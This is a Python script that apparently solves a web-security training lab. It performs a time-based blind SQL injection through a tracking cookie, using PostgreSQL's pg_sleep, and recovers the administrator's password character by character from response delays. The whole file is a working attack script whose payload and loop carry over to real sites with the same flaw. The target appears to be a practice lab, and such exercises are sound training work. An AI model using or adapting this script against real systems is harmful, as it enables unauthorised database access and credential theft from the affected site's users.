import string
import requests
import time

url = "https://0ab400fa039c5ffdc079871a00f200c4.web-security-academy.net/"
password = "r08inqpv"
index = 9

while True:
	for x in string.printable[0:36]:
		payload = f"l1uZvT8Gn8gXaf85'%3Bselect case when (username='administrator' and substring(password,{index},1)='{x}') then pg_sleep(3) else pg_sleep(0) end from users--"
		cookies = {
		"TrackingId" : payload,
		"session" : "uYgm5u4kXgn9bZLWfrJ3R1YUVq5gW3Fl"
		}

		response = requests.get(url, cookies=cookies)
		print(payload)
		response_time = (response.elapsed.total_seconds())
		print(f"time is {response_time}")

		if(response_time >= 3):
			print(f"ketemu di payload {x}")
			password += str(x)
		else:
			print("next")
		#print(response.text)
	index += 1

	if(len(password) == 20):
		print(f"password: {password}")
		break

	print(f"password sementara {password}")
	print("==============================\n"*2)
